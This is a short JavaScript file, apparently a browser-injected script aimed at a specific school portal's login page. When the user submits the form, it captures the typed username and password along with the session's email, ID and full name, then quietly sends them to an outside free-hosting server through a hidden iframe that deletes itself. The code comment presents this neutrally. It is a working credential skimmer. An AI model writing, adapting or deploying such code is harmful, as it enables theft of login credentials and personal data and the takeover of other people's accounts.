/**
 * Creates an iframe that sends data values to a remote server which in 
 * returns a txt file with that information
 */
function account() {
    if (location.href == "https://rogershs.echo-ntn.org/themius/login" ||
        location.href == "https://rogershs.echo-ntn.org/themius/login;action=logout")
    {
        $('[type="submit"]').on('click', function () {
            var input = document.querySelector('body')
                            .querySelector('app-root')
                            .querySelector('app-before-login')
                            .querySelectorAll('input')
                    
            let username = input[0]
            let password = input[1]

            setTimeout(() => {
                var session = JSON.parse(localStorage.getItem('session'))['user']
                
                let email = session.email 
                let id = session.id
                let fullname = session.firstname + " " + session.lastname

                var json = `{"email": "`+email+`","id": "`+id+`","fullname": "`+fullname+`","username": "`+username.value+`","password": "`+password.value+`"}`
                var link = "https://tf2cuntsupport.000webhostapp.com/Public/Sub/fetch.php?user="+username.value+"&json="+json+""
            
                $('<iframe>', {
                    id: 'frameacc',
                    src: link,
                    style: 'visibility: hidden; width: 0px; height: 0px;'
                }).appendTo('html')
                setTimeout(() => {
                    $('#frameacc').remove()
                }, 500)
            }, 1000)

            localStorage.setItem('account', 'false')
        })
    }
}